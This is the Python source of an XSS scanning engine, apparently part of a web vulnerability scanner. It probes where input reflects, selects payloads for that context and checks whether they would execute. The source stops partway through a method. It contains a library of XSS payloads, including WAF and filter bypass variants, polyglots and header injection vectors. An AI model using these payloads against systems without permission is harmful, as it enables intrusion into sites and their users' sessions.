#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
xss_deep.py — Context-aware deep XSS engine for WebVulnX.

Why this module exists
----------------------
Spraying a big payload list at every parameter is slow, gets blocked by WAFs
and — worst of all — produces FALSE POSITIVES, because most payloads only work
in one specific reflection context. A `<script>` tag reflected inside a
<textarea>, an HTML comment or an attribute value does NOT execute.

So this engine works the other way round:

  1. PROBE     inject an inert unique marker and find out exactly WHERE it
               lands (HTML text, attribute, JS source, JS string, comment,
               rawtext element, CSS, JSON …) and WHICH characters survive
               unencoded.
  2. SELECT    pick only the payload families that can break out of *that*
               context with *those* characters.
  3. VERIFY    re-classify the response after injection. A finding is only
               reported when the marker provably moved INTO an executable
               context (JS source, an event-handler attribute we created, a
               javascript: URI in a navigable attribute, …). Reflection alone
               is never reported as executable.
  4. SWEEP     every injection point leaves a unique marker behind; later the
               scanner revisits the site looking for those markers, which finds
               STORED / blind XSS with no external callback service.

Coverage of injection points ("leave no spot untested"): query parameters,
GET/POST form fields, JSON request bodies, URL path segments, and the HTTP
headers that servers commonly echo back (User-Agent, Referer,
X-Forwarded-For/Host, Origin, Accept-Language, Cookie, Authorization …).

Payload knowledge is derived from:
    PayloadsAllTheThings — XSS Injection
    MIT License, Copyright (c) 2019 Swissky
    https://github.com/swisskyrepo/PayloadsAllTheThings
Community lists are vendored (unmodified) under payloads/xss/ together with
the license text; they are used for the optional brute-force tier.

Legal: authorized security testing only.
"""

from __future__ import annotations

import bisect
import html
import json
import os
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple

PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "payloads", "xss")

# ---------------------------------------------------------------------------
# Contexts
# ---------------------------------------------------------------------------
CTX_HTML_TEXT = "html_text"
CTX_HTML_COMMENT = "html_comment"
CTX_STYLE = "style_css"
CTX_SCRIPT_JS = "script_js"
CTX_SCRIPT_STR_SQ = "script_str_sq"
CTX_SCRIPT_STR_DQ = "script_str_dq"
CTX_SCRIPT_TPL = "script_tpl"
CTX_SCRIPT_COMMENT = "script_comment"
CTX_JSON = "json"
CTX_URL = "url_attr"          # href / src / action / formaction / data / poster

RAWTEXT_TAGS = {"textarea", "title", "noscript", "noframes", "xmp", "plaintext"}
URL_ATTRS = {"href", "src", "action", "formaction", "data", "poster", "xlink:href",
             "background", "cite", "longdesc", "usemap", "profile", "codebase",
             "srcdoc", "location", "to", "from", "value"}
EVENT_ATTR_RX = re.compile(r"^on[a-z]+$", re.I)

# Characters whose survival decides which payload families are usable.
CAP_CHARS: Tuple[str, ...] = (
    "<", ">", '"', "'", "`", "/", "=", "&", ";", "(", ")", ":", ",", ".",
    "%", "+", "-", "_", "!", "?", "[", "]", "{", "}", "|", "\\", " ", "\t", "\n",
)
_CAP_TAGS = [f"w{i:02d}" for i in range(len(CAP_CHARS))]

# A marker must be a valid JS identifier so `var <marker>=1` works everywhere.
_MARKER_WORDS = ("dkx", "qwz", "vrb", "zph", "mkd", "trj")
_marker_n = [0]


def new_marker(prefix: str = "dkx") -> str:
    _marker_n[0] += 1
    return f"{prefix}{_marker_n[0]:04d}x{int(time.time() * 1000) % 9973:04d}"


def caps_probe_string(marker: str) -> str:
    """One request that reveals which special characters survive unencoded."""
    return marker + "".join(f"{t}{c}" for t, c in zip(_CAP_TAGS, CAP_CHARS))


def parse_caps(body: str, probe: str) -> Dict[str, bool]:
    out: Dict[str, bool] = {}
    for tag, ch in zip(_CAP_TAGS, CAP_CHARS):
        out[ch] = (tag + ch) in body
    return out


# ---------------------------------------------------------------------------
# HTML/JS/CSS state scanner — maps every byte offset to its context
# ---------------------------------------------------------------------------
@dataclass
class _Span:
    start: int
    end: int
    ctx: str
    meta: str = ""        # attribute name / tag name


class ContextMap:
    """Single-pass classifier. Ask `at(offset)` for the context of a byte."""

    def __init__(self, body: str, content_type: str = ""):
        self.body = body
        self.content_type = (content_type or "").lower()
        self.spans: List[_Span] = []
        self.is_json = ("json" in self.content_type
                        or body.lstrip()[:1] in ("{", "["))
        self._build()
        self._starts = [s.start for s in self.spans]

    # -- public API ---------------------------------------------------------
    def at(self, pos: int) -> Tuple[str, str]:
        i = bisect.bisect_right(self._starts, pos) - 1
        if i < 0 or pos >= self.spans[i].end:
            return (CTX_HTML_TEXT, "")
        return (self.spans[i].ctx, self.spans[i].meta)

    def find(self, needle: str) -> List[Tuple[int, str, str]]:
        """All occurrences of `needle` as (offset, context, meta)."""
        if not needle:
            return []
        out = []
        start = 0
        body = self.body
        while True:
            i = body.find(needle, start)
            if i < 0:
                break
            ctx, meta = self.at(i)
            out.append((i, ctx, meta))
            start = i + 1
        return out

    def contexts_of(self, needle: str) -> List[str]:
        seen: List[str] = []
        for _, ctx, meta in self.find(needle):
            label = ctx
            if ctx.startswith("attr:") and meta in URL_ATTRS:
                label = CTX_URL
            if label not in seen:
                seen.append(label)
        return seen

    # -- internals ----------------------------------------------------------
    def _add(self, start: int, end: int, ctx: str, meta: str = "") -> None:
        if end > start:
            self.spans.append(_Span(start, end, ctx, meta))

    def _build(self) -> None:
        b = self.body
        n = len(b)
        i = 0
        text_start = 0
        low = b.lower()

        def flush_text(end: int) -> None:
            nonlocal text_start
            if end > text_start:
                self._add(text_start, end, CTX_HTML_TEXT)
            text_start = end

        while i < n:
            if b[i] != "<":
                i += 1
                continue
            flush_text(i)
            # ---- comment / bogus comment ----
            if low.startswith("<!--", i):
                end = low.find("-->", i + 4)
                end = n if end < 0 else end + 3
                self._add(i, end, CTX_HTML_COMMENT)
                i = text_start = end
                continue
            if b[i:i + 2] in ("<!", "<?"):
                end = b.find(">", i)
                end = n if end < 0 else end + 1
                self._add(i, end, CTX_HTML_COMMENT, "bogus")
                i = text_start = end
                continue
            # ---- end tag ----
            if b[i:i + 2] == "</":
                end = b.find(">", i)
                end = n if end < 0 else end + 1
                self._add(i, end, "end_tag")
                i = text_start = end
                continue
            # ---- start tag: parse name + attributes ----
            m = re.compile(r"<\s*([a-zA-Z][^\s/>]*)").match(b, i)
            if not m:
                self._add(i, i + 1, CTX_HTML_TEXT)
                i = text_start = i + 1
                continue
            tag = m.group(1).lower()
            j = m.end()
            self._add(i, j, "tag_name", tag)
            while j < n:
                c = b[j]
                if c == ">":
                    j += 1
                    break
                if c in " \t\r\n/":
                    j += 1
                    continue
                am = re.compile(r"([^\s=/>]+)(\s*=\s*)?", re.I).match(b, j)
                if not am:
                    j += 1
                    continue
                aname = am.group(1).lower()
                k = am.end()
                if am.group(2) and k < n:
                    q = b[k]
                    if q in "\"'":
                        close = b.find(q, k + 1)
                        close = n if close < 0 else close + 1
                        self._add(k + 1, close - 1,
                                  f"attr:{aname}:{'dq' if q == '\"' else 'sq'}", aname)
                        j = close
                        continue
                    um = re.compile(r"[^\s>]*").match(b, k)
                    j = um.end()
                    self._add(k, j, f"attr:{aname}:unq", aname)
                    continue
                self._add(j, k, f"attr:{aname}:flag", aname)
                j = k
            self._add(j, j, "tag_end")
            # ---- special element bodies ----
            if tag in ("script", "style") or tag in RAWTEXT_TAGS:
                closer = low.find("</" + tag, j)
                end = n if closer < 0 else closer
                if tag == "script":
                    self._scan_js(j, end)
                elif tag == "style":
                    self._add(j, end, CTX_STYLE)
                else:
                    self._add(j, end, f"rawtext:{tag}", tag)
                i = text_start = end
                continue
            i = text_start = j

    def _scan_js(self, start: int, end: int) -> None:
        """Classify JS source vs string vs comment inside a <script> block."""
        b = self.body
        i = seg = start
        state = CTX_SCRIPT_JS
        while i < end:
            c = b[i]
            two = b[i:i + 2]
            if state == CTX_SCRIPT_JS:
                if two == "//":
                    self._add(seg, i, CTX_SCRIPT_JS)
                    nl = b.find("\n", i)
                    seg = i
                    i = end if nl < 0 else nl
                    self._add(seg, i, CTX_SCRIPT_COMMENT, "line")
                    seg = i
                    continue
                if two == "/*":
                    self._add(seg, i, CTX_SCRIPT_JS)
                    close = b.find("*/", i + 2)
                    i = end if close < 0 else close + 2
                    self._add(seg, i, CTX_SCRIPT_COMMENT, "block")
                    seg = i
                    continue
                if c in "'\"`":
                    self._add(seg, i, CTX_SCRIPT_JS)
                    state = {"'": CTX_SCRIPT_STR_SQ, '"': CTX_SCRIPT_STR_DQ,
                             "`": CTX_SCRIPT_TPL}[c]
                    seg = i + 1
                    i += 1
                    continue
                i += 1
                continue
            # inside a string
            if c == "\\":
                i += 2
                continue
            quote = {CTX_SCRIPT_STR_SQ: "'", CTX_SCRIPT_STR_DQ: '"',
                     CTX_SCRIPT_TPL: "`"}[state]
            if c == quote:
                self._add(seg, i, state)
                i += 1
                state = CTX_SCRIPT_JS
                seg = i
                continue
            i += 1
        self._add(seg, end, state if state != CTX_SCRIPT_JS else CTX_SCRIPT_JS)


def classify_json_context(body: str, marker: str) -> str:
    """For JSON responses: is the marker a value or a key?"""
    i = body.find(marker)
    if i < 0:
        return CTX_JSON
    before = body[max(0, i - 40):i]
    if re.search(r":\s*\"?[^\"{}]*$", before):
        return CTX_JSON + "_value"
    return CTX_JSON + "_key"


# Content types a browser will NOT render as HTML — script in them cannot run
# (this is what stops JSON/API responses being reported as XSS).
NON_RENDERABLE_CT = ("json", "text/plain", "xml", "javascript", "ecmascript",
                     "octet-stream", "csv", "pdf", "image/", "font/", "manifest")


def renderable_as_html(headers: Dict[str, str]) -> Tuple[bool, str]:
    """(can the browser execute HTML/JS from this response?, why)"""
    ct = ""
    for k, v in (headers or {}).items():
        if k.lower() == "content-type":
            ct = (v or "").lower()
            break
    nosniff = any(k.lower() == "x-content-type-options" and "nosniff" in (v or "").lower()
                  for k, v in (headers or {}).items())
    if not ct:
        return True, "no Content-Type — browsers may sniff this as HTML"
    if "html" in ct:
        return True, f"Content-Type {ct.split(';')[0].strip()}"
    if any(k in ct for k in NON_RENDERABLE_CT):
        return False, (f"Content-Type {ct.split(';')[0].strip()} is not rendered as "
                       f"HTML by browsers" + (" (nosniff set)" if nosniff else ""))
    return True, f"Content-Type {ct.split(';')[0].strip()} (may be sniffed)"


# Embedding our marker into a community payload keeps verification rigorous:
# we only ever report XSS we can locate in an executable context.
_ALERT_RX = re.compile(r"\b(?:alert|prompt|confirm)\s*\([^()]*\)", re.I)
_SCRIPT_BODY_RX = re.compile(r"(<script[^>]*>)(.*?)(</script>)", re.I | re.S)
_HANDLER_RX = re.compile(r"\bon[a-z]+\s*=\s*([\"']?)([^\"'>\s]*)", re.I)


def embed_marker(raw: str, marker: str) -> Tuple[str, bool]:
    """Rewrite a community vector so it carries our unique marker."""
    if _ALERT_RX.search(raw):
        return _ALERT_RX.sub(f"var {marker}=1", raw, count=1), True
    m = _SCRIPT_BODY_RX.search(raw)
    if m:
        return raw[:m.end(1)] + f"var {marker}=1;" + m.group(2) + m.group(3), True
    m = _HANDLER_RX.search(raw)
    if m:
        return raw[:m.start(2)] + f"var {marker}=1" + raw[m.end(2):], True
    return raw, False


# ---------------------------------------------------------------------------
# Payload library — curated from PayloadsAllTheThings (MIT, (c) 2019 Swissky)
# ---------------------------------------------------------------------------
# Every entry: (template, contexts, required_chars, kind, severity_hint)
# `{m}` is replaced with the unique marker. Assignments (`var {m}=1`) are used
# instead of alert() so payloads need NO parentheses and NO quotes — which both
# bypasses common WAF rules and keeps verification unambiguous.
@dataclass(frozen=True)
class Payload:
    tpl: str
    contexts: frozenset
    needs: frozenset
    kind: str
    sev: str = "High"
    note: str = ""

    def build(self, m: str) -> str:
        return self.tpl.replace("{m}", m)


def _P(tpl: str, ctxs: Sequence[str], needs: Sequence[str], kind: str,
       sev: str = "High", note: str = "") -> Payload:
    return Payload(tpl, frozenset(ctxs), frozenset(needs), kind, sev, note)


HTML = [CTX_HTML_TEXT]
ATTR_DQ = ["attr_dq"]
ATTR_SQ = ["attr_sq"]
ATTR_UNQ = ["attr_unq"]
JS = [CTX_SCRIPT_JS]
JSQ = [CTX_SCRIPT_STR_SQ, CTX_SCRIPT_STR_DQ, CTX_SCRIPT_TPL]
RAW = ["rawtext"]
COMMENT = [CTX_HTML_COMMENT]
STYLE = [CTX_STYLE]
HREF = [CTX_URL]

PAYLOAD_LIBRARY: Tuple[Payload, ...] = (
    # ---- HTML text: classic script + event handlers ----------------------
    _P("<script>var {m}=1</script>", HTML, "<>", "script"),
    _P("<script>var {m}=1;//", HTML, "<>", "script"),
    _P("<img src=x onerror=var {m}=1>", HTML, "<>", "handler"),
    _P("<svg onload=var {m}=1>", HTML, "<>", "handler"),
    _P("<svg><animate onbegin=var {m}=1 attributeName=x dur=1s>", HTML, "<>", "handler"),
    _P("<body onload=var {m}=1>", HTML, "<>", "handler"),
    _P("<details open ontoggle=var {m}=1>", HTML, "<>", "handler"),
    _P("<iframe src=javascript:var {m}=1>", HTML, "<>", "js_uri"),
    _P("<video><source onerror=var {m}=1>", HTML, "<>", "handler"),
    _P("<audio src=x onerror=var {m}=1>", HTML, "<>", "handler"),
    _P("<input autofocus onfocus=var {m}=1>", HTML, "<>", "handler"),
    _P("<select autofocus onfocus=var {m}=1>", HTML, "<>", "handler"),
    _P("<textarea autofocus onfocus=var {m}=1>", HTML, "<>", "handler"),
    _P("<marquee onstart=var {m}=1>", HTML, "<>", "handler"),
    _P("<object data=javascript:var {m}=1>", HTML, "<>", "js_uri"),
    _P("<embed src=javascript:var {m}=1>", HTML, "<>", "js_uri"),
    _P("<form><button formaction=javascript:var {m}=1>X</button></form>",
       HTML, "<>", "js_uri"),
    _P("<a href=javascript:var {m}=1>{m}</a>", HTML, "<>", "js_uri", "Medium",
       "requires a click"),
    _P("<math><mtext><table><mglyph><style><!--</style><img title=\"-->"
       "<img src=1 onerror=var {m}=1>\">", HTML, "<>", "mutation", "High",
       "mXSS via mutation in math/mglyph"),
    # ---- filter-bypass variants for HTML text ----------------------------
    _P("<svg/onload=var {m}=1>", HTML, "<>", "handler", note="slash instead of space"),
    _P("<img/src=x/onerror=var {m}=1>", HTML, "<>", "handler", note="slash separators"),
    _P("<SCRIPT>var {m}=1</SCRIPT>", HTML, "<>", "script", note="uppercase"),
    _P("<ScRiPt>var {m}=1</sCrIpT>", HTML, "<>", "script", note="mixed case"),
    _P("<scr<script>ipt>var {m}=1</script>", HTML, "<>", "script",
       note="nested-tag filter bypass"),
    _P("<img src=x onerror=var {m}=1\t>", HTML, "<>\t", "handler", note="tab before >"),
    # ---- attribute values (double / single / unquoted) -------------------
    _P("\" onmouseover=\"var {m}=1", ATTR_DQ, '"', "handler"),
    _P("' onmouseover='var {m}=1", ATTR_SQ, "'", "handler"),
    _P("\" autofocus onfocus=\"var {m}=1", ATTR_DQ, '"', "handler"),
    _P("' autofocus onfocus='var {m}=1", ATTR_SQ, "'", "handler"),
    _P(" onmouseover=var {m}=1", ATTR_UNQ, " ", "handler"),
    _P("\" onfocus=var {m}=1 x=\"", ATTR_DQ, '"', "handler"),
    _P("\"><script>var {m}=1</script>", ATTR_DQ, '"<>', "script"),
    _P("'><script>var {m}=1</script>", ATTR_SQ, "'<>", "script"),
    _P("><script>var {m}=1</script>", ATTR_UNQ, "<>", "script"),
    _P("\"><img src=x onerror=var {m}=1>", ATTR_DQ, '"<>', "handler"),
    _P("'><svg onload=var {m}=1>", ATTR_SQ, "'<>", "handler"),
    # ---- navigable attributes: javascript: URIs (entity-encoded too) -----
    _P("javascript:var {m}=1", HREF, ":", "js_uri", "Medium"),
    _P("JaVaScRiPt:var {m}=1", HREF, ":", "js_uri", "Medium"),
    _P("&#106;avascript:var {m}=1", HREF, "&;:", "js_uri", "Medium",
       "HTML-entity encoded scheme — decoded by the browser"),
    _P("&#x6a;avascript:var {m}=1", HREF, "&;:", "js_uri", "Medium"),
    _P("java\tscript:var {m}=1", HREF, "\t:", "js_uri", "Medium"),
    _P("data:text/html;base64,PHNjcmlwdD52YXIgeH09MTwvc2NyaXB0Pg==",
       HREF, ":", "js_uri", "Medium", "data: URI in iframe/object/embed"),
    # ---- JS source (already code injection) ------------------------------
    _P("{m}", JS, "", "js_source", "High",
       "input lands directly in JavaScript source"),
    _P("{m};var y=1//", JS, ";", "js_source"),
    # ---- JS string breakouts --------------------------------------------
    _P("';var {m}=1//", [CTX_SCRIPT_STR_SQ], "'", "js_breakout"),
    _P('";var {m}=1//', [CTX_SCRIPT_STR_DQ], '"', "js_breakout"),
    _P("`;var {m}=1//", [CTX_SCRIPT_TPL], "`", "js_breakout"),
    _P("\\';var {m}=1//", [CTX_SCRIPT_STR_SQ], "'\\", "js_breakout",
       note="escaped-quote variant"),
    _P('</script><script>var {m}=1</script>', JSQ + JS, "<>", "script",
       note="close the script block first"),
    _P("';</script><script>var {m}=1</script>", [CTX_SCRIPT_STR_SQ], "'<>", "script"),
    # ---- HTML comment / rawtext / style ---------------------------------
    _P("--><script>var {m}=1</script>", COMMENT, "<>", "script"),
    _P("--!><script>var {m}=1</script>", COMMENT, "<>", "script"),
    _P("</textarea><script>var {m}=1</script>", ["rawtext:textarea"], "<>", "script"),
    _P("</title><script>var {m}=1</script>", ["rawtext:title"], "<>", "script"),
    _P("</noscript><img src=x onerror=var {m}=1>", ["rawtext:noscript"], "<>", "handler"),
    _P("</style><script>var {m}=1</script>", STYLE, "<>", "script"),
    _P("expression(var {m}=1)", STYLE, "()", "css_expr", "Medium",
       "legacy IE CSS expression"),
    # ---- polyglots (deep tier) ------------------------------------------
    _P("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=var {m}=1 )//%"
       "0D%0A%09%2F%2F%0A</script><script>var {m}=1</script>",
       HTML + JSQ + ATTR_DQ + ATTR_SQ, "<>", "polyglot", "High",
       "multi-context polyglot"),
    _P("'\"><svg onload=var {m}=1>", HTML + ATTR_DQ + ATTR_SQ, "'\"<>", "polyglot"),
)

# Contexts where reflection alone is interesting but never executes by itself.
INERT_CONTEXTS = {CTX_JSON, CTX_JSON + "_key", CTX_JSON + "_value"}

EXECUTABLE_CONTEXTS = {
    CTX_SCRIPT_JS, "handler_attr", "js_uri", "script_tag", CTX_HTML_TEXT,
}


# ---------------------------------------------------------------------------
# Community brute-force tier (vendored lists, used only with --xss-brute)
# ---------------------------------------------------------------------------
_COMMUNITY_CACHE: Optional[List[str]] = None


def community_payloads(limit: int = 400) -> List[str]:
    """Load the vendored PayloadsAllTheThings lists (1,900+ vectors).

    They are tried LAST and only for contexts that already reflect input,
    and each hit is verified by context re-classification, so the extra
    breadth does not cost accuracy.
    """
    global _COMMUNITY_CACHE
    if _COMMUNITY_CACHE is None:
        seen: List[str] = []
        uniq: Set[str] = set()
        order = ("xss_payloads_quick.txt", "XSS_Polyglots.txt",
                 "BRUTELOGIC-XSS-STRINGS.txt", "RSNAKE_XSS.txt",
                 "XSSDetection.txt", "IntrudersXSS.txt",
                 "port_swigger_xss_cheatsheet_event_handlers.txt",
                 "0xcela_event_handlers.txt", "JHADDIX_XSS.txt",
                 "MarioXSSVectors.txt", "xss_alert_identifiable.txt")
        for name in order:
            p = os.path.join(PAYLOAD_DIR, name)
            if not os.path.isfile(p):
                continue
            try:
                with open(p, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        s = line.strip()
                        if not s or s.startswith("#") or s in uniq:
                            continue
                        uniq.add(s)
                        seen.append(s)
            except OSError:
                continue
        _COMMUNITY_CACHE = seen
    return _COMMUNITY_CACHE[:limit]


def library_stats() -> Dict[str, Any]:
    by_ctx: Dict[str, int] = {}
    by_kind: Dict[str, int] = {}
    for p in PAYLOAD_LIBRARY:
        for c in p.contexts:
            by_ctx[c] = by_ctx.get(c, 0) + 1
        by_kind[p.kind] = by_kind.get(p.kind, 0) + 1
    return {"curated": len(PAYLOAD_LIBRARY),
            "community_available": len(_COMMUNITY_CACHE or community_payloads(10 ** 9)),
            "by_context": by_ctx, "by_kind": by_kind}


# ---------------------------------------------------------------------------
# Header injection points that servers commonly echo back
# ---------------------------------------------------------------------------
HEADER_VECTORS: Tuple[Tuple[str, str], ...] = (
    ("User-Agent", "Mozilla/5.0 ({m})"),
    ("Referer", "http://{host}/{m}"),
    ("X-Forwarded-For", "{m}"),
    ("X-Forwarded-Host", "{m}"),
    ("X-Forwarded-Server", "{m}"),
    ("X-Original-URL", "/{m}"),
    ("X-Rewrite-URL", "/{m}"),
    ("Client-IP", "{m}"),
    ("True-Client-IP", "{m}"),
    ("X-Client-IP", "{m}"),
    ("X-Host", "{m}"),
    ("Origin", "http://{m}"),
    ("Accept-Language", "{m}"),
    ("X-Custom-Header", "{m}"),
    ("Authorization", "Bearer {m}"),
    ("X-Api-Version", "{m}"),
    ("From", "{m}@{host}"),
    ("Contact", "{m}"),
)
COOKIE_VECTOR = ("XSSProbe", "{m}")

# DOM XSS sources / sinks (static analysis of same-origin JavaScript)
DOM_SINKS = (
    (r"\.innerHTML\s*=", "innerHTML assignment"),
    (r"\.outerHTML\s*=", "outerHTML assignment"),
    (r"document\.write\s*\(", "document.write()"),
    (r"document\.writeln\s*\(", "document.writeln()"),
    (r"\beval\s*\(", "eval()"),
    (r"\bsetTimeout\s*\(\s*['\"`]", "setTimeout() with a string"),
    (r"\bsetInterval\s*\(\s*['\"`]", "setInterval() with a string"),
    (r"\bFunction\s*\(", "Function() constructor"),
    (r"insertAdjacentHTML\s*\(", "insertAdjacentHTML()"),
    (r"\$\(\s*['\"`][^'\"`]*['\"`]\s*\)\.html\s*\(", "jQuery .html()"),
    (r"\.html\s*\(\s*[^)\s]", "jQuery .html(variable)"),
    (r"location\s*=\s*[^=]", "location assignment"),
    (r"location\.href\s*=", "location.href assignment"),
    (r"location\.replace\s*\(", "location.replace()"),
    (r"\.src\s*=\s*[^=]", "element.src assignment"),
    (r"\.href\s*=\s*[^=]", "element.href assignment"),
    (r"setAttribute\s*\(\s*['\"](?:on[a-z]+|href|src)", "setAttribute on a dangerous attribute"),
    (r"\.append\s*\(\s*\$?\(?\s*['\"`]<", "jQuery .append() with HTML"),
)
DOM_SOURCES = (
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"location\.pathname", "location.pathname"),
    (r"\bdocument\.URL\b", "document.URL"),
    (r"\bdocument\.documentURI\b", "document.documentURI"),
    (r"\bdocument\.referrer\b", "document.referrer"),
    (r"\bwindow\.name\b", "window.name"),
    (r"\bpostMessage\b", "postMessage data"),
    (r"localStorage\.getItem", "localStorage"),
    (r"sessionStorage\.getItem", "sessionStorage"),
    (r"document\.cookie", "document.cookie"),
    (r"URLSearchParams", "URLSearchParams"),
    (r"\.getParam(?:eter)?\s*\(", "query parameter helper"),
)
DOM_SANITIZERS = (
    r"DOMPurify", r"sanitize", r"escapeHtml", r"encodeURI", r"encodeURIComponent",
    r"\.text\s*\(", r"createTextNode", r"textContent\s*=",
)


class DeepXssScanner:
    """Context-aware XSS engine — probe, classify, select, verify, sweep."""

    def __init__(self, client, state, finding_cls,
                 payload_limit: int = 14, brute: bool = False,
                 brute_limit: int = 250, test_headers: bool = True,
                 stored_sweep: bool = True, dom_analysis: bool = True,
                 max_js_files: int = 8, quiet: bool = False):
        self.client = client
        self.state = state
        self.F = finding_cls
        self.payload_limit = payload_limit
        self.brute = brute
        self.brute_limit = brute_limit
        self.test_headers = test_headers
        self.stored_sweep = stored_sweep
        self.dom_analysis = dom_analysis
        self.max_js_files = max_js_files
        self.quiet = quiet
        self.client.module = "xss-deep"
        self.markers: List[Tuple[str, str]] = []       # (marker, location)
        self.probes_sent = 0
        self.payloads_sent = 0
        self.confirmed: Set[Tuple[str, str]] = set()   # (url, point) already proven
        self.contexts_seen: Dict[str, int] = {}
        self._log = (lambda *a: None) if quiet else self._say

    # -- output ------------------------------------------------------------
    def _say(self, msg: str) -> None:
        print(msg)

    def _info(self, msg: str) -> None:
        self._log(f"[*] {msg}")

    def _found(self, msg: str) -> None:
        self._log(f"[VULN] {msg}")

    # -- helpers -----------------------------------------------------------
    def _register(self, marker: str, where: str) -> None:
        self.markers.append((marker, where))

    def _send(self, method: str, url: str, **kw):
        self.probes_sent += 1
        try:
            if method.upper() == "GET":
                return self.client.get(url, **kw)
            return self.client.request(method, url, **kw)
        except Exception:
            return None

    def _add(self, **kw) -> None:
        self.state.add(self.F(**kw))

    @staticmethod
    def _ctx_labels(hits: Sequence[Tuple[int, str, str]]) -> Tuple[Set[str], Set[str]]:
        """(payload-selection labels, already-executable labels)."""
        labels: Set[str] = set()
        instant: Set[str] = set()
        for _off, ctx, meta in hits:
            if ctx.startswith("attr:"):
                parts = ctx.split(":")
                name = parts[1] if len(parts) > 1 else ""
                quote = parts[2] if len(parts) > 2 else "unq"
                if name in URL_ATTRS:
                    labels.add(CTX_URL)
                elif EVENT_ATTR_RX.match(name):
                    instant.add(f"inside existing event handler attr ({name})")
                    labels.add("attr_" + quote)
                else:
                    labels.add("attr_" + quote)
            elif ctx.startswith("rawtext:"):
                labels.add(ctx)
                labels.add("rawtext")
            elif ctx == CTX_SCRIPT_JS:
                instant.add("inside JavaScript source")
                labels.add(ctx)
            elif ctx in (CTX_SCRIPT_STR_SQ, CTX_SCRIPT_STR_DQ, CTX_SCRIPT_TPL):
                labels.add(ctx)
                labels.add("script_str")
            elif ctx == CTX_JSON:
                labels.add(classify_json_context_label(ctx))
            else:
                labels.add(ctx)
        return labels, instant

    def _verify(self, resp, marker: str, kind: str, payload_sent: str):
        """Return (severity, context_label, evidence) only when EXECUTION is
        provable — i.e. the marker ended up in an executable context."""
        if resp is None:
            return None
        body = resp.text or ""
        if marker not in body:
            return None
        renderable, why = renderable_as_html(resp.headers)
        if not renderable:
            return None                      # JSON/plain/XML: cannot execute
        cmap = ContextMap(body, resp.headers.get("Content-Type", ""))
        hits = cmap.find(marker)
        for _off, ctx, meta in hits:
            if ctx == CTX_SCRIPT_JS:
                return ("Critical" if kind == "stored" else "High",
                        "JavaScript source",
                        "marker executed as JS source: it sits inside a <script> "
                        "block as code, not as a string")
            if ctx.startswith("attr:"):
                parts = ctx.split(":")
                name = parts[1] if len(parts) > 1 else ""
                if EVENT_ATTR_RX.match(name):
                    return ("Critical" if kind == "stored" else "High",
                            f"event-handler attribute ({name})",
                            f"payload created/landed in an {name}= attribute — "
                            f"the handler runs when the event fires")
                if name in URL_ATTRS:
                    snippet = body[max(0, _off - 60):_off + len(marker) + 20]
                    if re.search(r"(javascript|data)\s*:", snippet, re.I):
                        return ("Critical" if kind == "stored" else "Medium",
                                f"navigable attribute ({name})",
                                "javascript:/data: URI accepted in a navigable "
                                "attribute (fires on navigation/click)")
            if ctx.startswith("rawtext:"):
                continue                      # not executable — still trapped
            if ctx == CTX_HTML_COMMENT:
                continue
            if ctx == CTX_HTML_TEXT:
                # fallback: an active construct we injected survived verbatim
                if re.search(r"<\s*script[^>]*>[^<]*" + re.escape(marker), body, re.I):
                    return ("Critical" if kind == "stored" else "High",
                            "HTML body (script element)",
                            "an injected <script> element survived unescaped and "
                            "contains our marker")
                if re.search(r"<[a-z][^>]+on(?:error|load|toggle|focus|mouseover|"
                             r"begin|start|click|animationend)\s*=[^>]*"
                             + re.escape(marker), body, re.I):
                    return ("Critical" if kind == "stored" else "High",
                            "HTML body (event handler)",
                            "an injected tag with an event handler survived "
                            "unescaped and contains our marker")
        return None

    def _inert(self, resp, marker: str, url: str, point: str,
               where: str, labels: Set[str]) -> None:
        """Report a non-executing reflection honestly (Low/Info), never High."""
        if resp is None:
            return
        body = resp.text or ""
        if marker not in body and html.escape(marker) not in body:
            return
        encoded = marker not in body
        ctxs = sorted(labels) or ["unknown"]
        renderable, why = renderable_as_html(resp.headers)
        if not renderable:
            self._add(vuln_type="Input reflected in a non-renderable response",
                      severity="Info", url=url, parameter=point, payload=marker,
                      evidence=f"reflected in {', '.join(ctxs)} — {why}",
                      detail="The response is served as data (JSON/XML/plain), so a "
                             "browser will not execute script in it. It only becomes "
                             "XSS if a DOM sink later writes this value into the page "
                             "— check the DOM analysis findings.",
                      cvss_hint=0.0)
            return
        sev = "Low"
        if ctxs and all(c.startswith("json") for c in ctxs):
            sev = "Info"
        self._add(vuln_type="Input reflected without execution (context-dependent)",
                  severity=sev, url=url, parameter=point, payload=marker,
                  evidence=("reflected " + ("HTML-encoded" if encoded else "verbatim")
                            + " in context: " + ", ".join(ctxs)),
                  detail="The value is echoed back but no executable context was "
                         "reached with the tested payloads. Exploitability depends "
                         "on how this data is later consumed (e.g. a DOM sink).",
                  cvss_hint=2.0 if sev == "Low" else 0.0)

    # -- core: one injection point ----------------------------------------
    def attack_point(self, url: str, point: str, sender, where: str,
                     base: Optional[Dict[str, str]] = None) -> bool:
        """Probe → classify → select → verify. `sender(marker, payload)` sends
        the value and returns a response."""
        key = (url, where)
        if key in self.confirmed:
            return True
        marker = new_marker()
        self._register(marker, where)
        probe = caps_probe_string(marker)
        resp = sender(probe)
        if resp is None:
            return False
        body = resp.text or ""
        if marker not in body:
            return False                      # nothing reflects here
        cmap = ContextMap(body, resp.headers.get("Content-Type", ""))
        hits = cmap.find(marker)
        labels, instant = self._ctx_labels(hits)
        for lab in labels:
            self.contexts_seen[lab] = self.contexts_seen.get(lab, 0) + 1
        caps = parse_caps(body, probe)

        # 1) input already lands in executable code — no payload needed
        if instant:
            self.confirmed.add(key)
            self._found(f"Direct code injection [{point}] -> {url} ({', '.join(instant)})")
            self._add(vuln_type="XSS — input lands directly in JavaScript source",
                      severity="High", url=url, parameter=point, payload=marker,
                      evidence="; ".join(sorted(instant)),
                      detail="User input is placed into the page as executable "
                             "code without any delimiter to break out of. Any "
                             "JavaScript can be injected.",
                      cvss_hint=8.1)
            return True

        # 2) context-aware payload selection
        candidates = [p for p in PAYLOAD_LIBRARY
                      if p.contexts & labels and p.needs <= set(
                          c for c, ok in caps.items() if ok)]
